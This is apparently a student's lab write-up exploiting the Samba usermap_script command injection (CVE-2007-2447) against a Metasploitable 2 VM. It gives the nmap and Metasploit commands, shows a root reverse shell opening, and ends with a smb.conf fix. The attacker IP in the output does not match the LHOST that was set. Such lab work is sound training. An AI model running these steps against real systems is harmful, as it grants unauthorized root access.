# 08 — Samba Usermap Script RCE (CVE-2007-2447)

## Environment
- Attacker: Kali Linux 192.168.56.102
- Target: Metasploitable 2 192.168.56.101
- Date: 18 May 2026
- Port: 445
- CVE: CVE-2007-2447

## Overview
Exploited a command injection vulnerability in Samba 3.0.20 
where user input in the username field is passed directly to 
/bin/sh without sanitization. This gives an attacker instant 
remote code execution as root.

## Tools
msfconsole, nmap

## Commands

```bash
nmap -p 445 --script smb-os-discovery 192.168.56.101

use exploit/multi/samba/usermap_script
show options
set RHOSTS 192.168.56.101
set LHOST 192.168.56.102
run
```

## Output

```text
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   FQDN: metasploitable.localdomain

[*] Command shell session 1 opened
(192.168.56.103:4444 -> 192.168.56.101:50450)
at 2026-05-18 12:55:13 -0400
```

Our IP is now connected to the target and we are logged in 
as root.

## Findings
Samba 3.0.20 was confirmed running. The exploit triggered 
instantly and opened a root shell. A single misconfigured 
line in smb.conf allowed complete system compromise with 
no credentials required.

## Defense Applied

Edited `/etc/samba/smb.conf` under `[global]`:

```text
username map script =
```

(setting it to empty disables the vulnerable feature)

```bash
sudo /etc/init.d/samba restart
```

Re-ran the exploit — no session was created.

## What I Learned
Command injection through a misconfigured service is one 
of the most powerful attack types. This CVE is from 2007 
but unpatched systems still run this version today. Always 
audit service configurations after installation and patch 
immediately when vulnerabilities are disclosed.
